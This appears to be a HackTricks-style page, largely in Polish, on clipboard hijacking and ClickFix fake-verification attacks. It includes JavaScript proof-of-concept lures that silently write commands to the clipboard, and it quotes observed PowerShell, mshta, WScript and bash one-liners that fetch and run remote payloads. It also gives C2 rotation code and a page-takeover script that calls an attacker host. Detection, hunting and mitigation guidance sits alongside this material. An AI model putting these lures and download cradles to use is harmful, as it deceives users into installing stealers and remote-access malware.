# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nigdy nie wklejaj niczego, czego samodzielnie nie skopiowałeś." – stare, ale wciąż trafne zalecenie

## Przegląd

Clipboard hijacking – also known as *pastejacking* – wykorzystuje fakt, że użytkownicy rutynowo kopiują i wklejają polecenia, nie sprawdzając ich. Złośliwa strona internetowa (lub jakikolwiek kontekst obsługujący JavaScript, taki jak aplikacja Electron czy Desktop) programowo umieszcza w schowku systemowym tekst kontrolowany przez atakującego. Ofiary są zachęcane, zwykle za pomocą starannie przygotowanych instrukcji inżynierii społecznej, do naciśnięcia **Win + R** (okno Uruchom), **Win + X** (menu szybkiego dostępu / PowerShell), lub otwarcia terminala i *wklejenia* zawartości schowka, co natychmiast uruchamia dowolne polecenia.

Ponieważ **żaden plik nie jest pobierany i żaden załącznik nie jest otwierany**, technika ta omija większość zabezpieczeń poczty e-mail i treści webowych, które monitorują załączniki, makra lub bezpośrednie wykonywanie poleceń. W związku z tym atak jest popularny w kampaniach phishingowych dostarczających commodity malware families such as NetSupport RAT, Latrodectus loader or Lumma Stealer.

## Wymuszone przyciski „Kopiuj” i ukryte payloady (macOS one-liners)

Niektóre macOS infostealery klonują strony instalatorów (np. Homebrew) i **wymuszają użycie przycisku „Kopiuj”**, tak że użytkownicy nie mogą zaznaczyć tylko widocznego tekstu. Zawartość schowka zawiera oczekiwane polecenie instalacyjne oraz dołączony Base64 payload (np. `...; echo <b64> | base64 -d | sh`), więc pojedyncze wklejenie wykonuje obie części, podczas gdy UI ukrywa dodatkowy etap.

## Proof-of-Concept w JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starsze kampanie używały `document.execCommand('copy')`, nowsze opierają się na asynchronicznym **Clipboard API** (`navigator.clipboard.writeText`).

## Przebieg ClickFix / ClearFake

1. Użytkownik odwiedza typosquatowaną lub skompromitowaną stronę (np. `docusign.sa[.]com`)
2. Wstrzyknięty skrypt **ClearFake** JavaScript wywołuje helper `unsecuredCopyToClipboard()`, który po cichu zapisuje w clipboard Base64-encoded PowerShell one-liner.
3. Instrukcje HTML każą ofierze: *„Naciśnij **Win + R**, wklej polecenie i naciśnij Enter, aby rozwiązać problem.”*
4. `powershell.exe` uruchamia się, pobierając archiwum zawierające prawdziwy plik wykonywalny oraz złośliwy DLL (classic DLL sideloading).
5. Loader odszyfrowuje dodatkowe etapy, wstrzykuje shellcode i instaluje persistence (np. scheduled task) – ostatecznie uruchamiając NetSupport RAT / Latrodectus / Lumma Stealer.

### Przykład łańcucha NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legalny Java WebStart) przeszukuje swój katalog w poszukiwaniu `msvcp140.dll`.
* Złośliwy plik DLL dynamicznie rozwiązuje wywołania API za pomocą **GetProcAddress**, pobiera dwa binaria (`data_3.bin`, `data_4.bin`) przy użyciu **curl.exe**, odszyfrowuje je za pomocą klucza rolling XOR `"https://google.com/"`, wstrzykuje finalny shellcode i rozpakowuje **client32.exe** (NetSupport RAT) do `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Pobiera `la.txt` przy użyciu **curl.exe**
2. Uruchamia downloader JScript wewnątrz **cscript.exe**
3. Pobiera MSI payload → umieszcza `libcef.dll` obok podpisanej aplikacji → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer przez MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Wywołanie **mshta** uruchamia ukryty skrypt PowerShell, który pobiera `PartyContinued.exe`, wypakowuje `Boat.pst` (CAB), odtwarza `AutoIt3.exe` przy użyciu `extrac32` i konkatenacji plików, a na końcu uruchamia skrypt `.a3x`, który eksfiltruje poświadczenia przeglądarki do `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Niektóre kampanie ClickFix całkowicie pomijają pobieranie plików i instruują ofiary, aby wkleiły jednolinijkowy ciąg poleceń, który pobiera i wykonuje JavaScript przez WSH, utrwala go i codziennie zmienia C2. Przykładowy zaobserwowany łańcuch:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Kluczowe cechy
- Zamaskowany URL odwracany w czasie wykonywania, aby utrudnić powierzchowną inspekcję.
- JavaScript zapewnia trwałość za pomocą Startup LNK (WScript/CScript) i wybiera C2 na podstawie bieżącego dnia – umożliwiając szybką rotację domen.

Minimalny fragment JS używany do rotacji C2s według daty:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Następny etap zwykle wdraża loader, który ustanawia persistence i pobiera RAT (np. PureHVNC), często pinning TLS do hardcoded certificate i dzieląc ruch na kawałki.

Detection ideas specific to this variant
- Drzewo procesów: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (lub `cscript.exe`).
- Startup artifacts: LNK w `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wywołujący WScript/CScript ze ścieżką JS pod `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU i telemetryka linii poleceń zawierająca `.split('').reverse().join('')` lub `eval(a.responseText)`.
- Powtarzające się `powershell -NoProfile -NonInteractive -Command -` z dużymi stdin payloadami służącymi do zasilenia długich skryptów bez długich linii poleceń.
- Scheduled Tasks, które następnie wykonują LOLBins takie jak `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` w zadaniu/ścieżce wyglądającej na updater (np. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Codziennie rotujące hostnames C2 i URL-e z patternem `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korelować zdarzenia zapisu do schowka, po których następuje wklejenie przez Win+R, a następnie natychmiastowe uruchomienie `powershell.exe`.

Blue-teams mogą łączyć telemetrykę schowka, tworzenia procesów i rejestru, aby precyzyjnie zlokalizować nadużycia pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` przechowuje historię poleceń **Win + R** – szukać nietypowych wpisów Base64 / obfuskowanych.
* Security Event ID **4688** (Process Creation), gdzie `ParentImage` == `explorer.exe` i `NewProcessName` w { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** dla tworzeń plików pod `%LocalAppData%\Microsoft\Windows\WinX\` lub w folderach tymczasowych tuż przed podejrzanym zdarzeniem 4688.
* EDR clipboard sensors (jeśli obecne) – korelować `Clipboard Write` następujące bezpośrednio przed nowym procesem PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Ostatnie kampanie masowo produkują fałszywe strony weryfikacyjne CDN/przeglądarki ("Just a moment…", IUAM-style), które zmuszają użytkowników do skopiowania komend specyficznych dla OS ze schowka do natywnych konsol. To przenosi wykonanie poza sandbox przeglądarki i działa zarówno na Windows, jak i macOS.

Key traits of the builder-generated pages
- Wykrywanie OS przez `navigator.userAgent` w celu dostosowania payloadów (Windows PowerShell/CMD vs. macOS Terminal). Opcjonalne decoys/no-ops dla nieobsługiwanych OS, aby utrzymać iluzję.
- Automatyczne kopiowanie do schowka przy benign UI actions (checkbox/Copy), podczas gdy widoczny tekst może różnić się od zawartości schowka.
- Blokowanie mobile i popover z instrukcjami krok po kroku: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opcjonalna obfuskacja i single-file injector do nadpisania DOM kompromitowanej strony interfejsem w stylu Tailwind (nie jest wymagana rejestracja nowej domeny).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence pierwszego uruchomienia
- Użyj `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, aby wykonanie kontynuowało się po zamknięciu terminala, zmniejszając widoczne artefakty.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Strony, które wiążą Clipboard API z widgetami weryfikacyjnymi; rozbieżność między wyświetlanym tekstem a clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace w podejrzanych kontekstach.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` krótko po interakcji z przeglądarką; batch/MSI installers uruchamiane z `%TEMP%`.
- macOS endpoint: Terminal/iTerm uruchamiające `bash`/`curl`/`base64 -d` z `nohup` w pobliżu zdarzeń przeglądarki; background jobs przetrzymujące zamknięcie terminala.
- Skojarz historię `RunMRU` Win+R i zapisy do schowka z późniejszym tworzeniem procesów konsoli.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake nadal kompromituje strony WordPress i wstrzykuje loader JavaScript, który łączy zewnętrzne hosty (Cloudflare Workers, GitHub/jsDelivr) i nawet wywołania blockchain “etherhiding” (np. POSTy do Binance Smart Chain API, takie jak `bsc-testnet.drpc[.]org`) aby pobrać aktualną logikę wabika. Ostatnie nakładki intensywnie używają fake CAPTCHAs, które instruują użytkowników, by kopiowali/wklejali one-linera (T1204.004) zamiast pobierać cokolwiek.
- Początkowa egzekucja jest coraz częściej delegowana do signed script hosts/LOLBAS. January 2026 chains zamieniły wcześniejsze użycie `mshta` na wbudowany `SyncAppvPublishingServer.vbs` uruchamiany przez `WScript.exe`, przekazując PowerShell-like argumenty z aliasami/wildcardami do pobrania zdalnej zawartości:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` jest podpisany i zwykle używany przez App-V; w połączeniu z `WScript.exe` i nietypowymi argumentami (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) staje się wysokowartościowym etapem LOLBAS dla ClearFake.
- W lutym 2026 fałszywe CAPTCHA payloads powróciły do czystych PowerShell download cradles. Dwa działające przykłady:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Pierwszy łańcuch to grabber w pamięci `iex(irm ...)`; drugi robi staging przez `WinHttp.WinHttpRequest.5.1`, zapisuje tymczasowy `.ps1`, a następnie uruchamia z `-ep bypass` w ukrytym oknie.

Detection/hunting tips for these variants
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` or PowerShell cradles immediately after clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Network: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
- File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
